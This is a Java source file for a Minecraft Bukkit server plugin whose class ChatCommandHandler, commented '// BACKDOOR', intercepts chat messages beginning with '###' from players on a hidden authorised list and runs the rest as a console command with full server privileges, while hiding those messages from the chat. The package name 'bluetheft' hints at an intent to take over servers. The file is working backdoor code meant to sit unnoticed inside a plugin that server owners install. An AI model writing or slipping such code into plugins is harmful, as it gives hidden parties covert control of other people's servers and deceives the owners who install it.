package com.bluetheft;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.entity.Player;

public class ChatCommandHandler implements Listener { // BACKDOOR

    @EventHandler
    public void onChatMessage(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        // Vérifie si le message commence par le préfixe ###
        if (message.startsWith("###")) {
            // Supprime le préfixe pour obtenir uniquement la commande
            String command = message.substring(3).trim();

            // Vérifie si le joueur est autorisé
            if (AuthorizedPlayers.isAuthorized(player.getName())) {
                // Exécute la commande dans la console
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);

                // Empêche le message d'apparaître dans le chat
                event.setCancelled(true);

                // Envoie un message de confirmation au joueur
                player.sendMessage(ChatColor.GREEN + "Commande exécutée : " + command);
            } else {
                // Si le joueur n'est pas autorisé, lui envoyer un message d'erreur
                //player.sendMessage(ChatColor.RED + "Vous n'êtes pas autorisé à utiliser cette commande.");
                event.setCancelled(true);
            }
        }
    }
}
